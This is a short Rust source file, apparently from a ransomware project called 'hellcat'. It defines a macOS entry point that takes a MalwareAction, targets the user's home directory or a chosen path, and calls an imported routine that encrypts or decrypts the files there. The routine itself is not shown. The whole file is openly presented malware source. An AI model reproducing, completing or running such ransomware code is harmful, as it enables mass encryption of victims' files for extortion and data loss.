use dirs;

// import encyrption module in ./encryption/enc.rs
use crate::encryption::enc::{self};
use crate::types::{MalwareAction};

pub async fn hellcat_macos(actions:MalwareAction) {
    // get the home directory
    let home = dirs::home_dir().unwrap();
    let mut home_str = home.to_str().unwrap();

    if actions.path != "_home" {
        home_str = actions.path.as_str();
    }

    println!("Home {}", home_str);

    if actions.encrypt {
        enc::encryption(home_str, false);
    } else {
        enc::encryption(home_str, true);
    }
}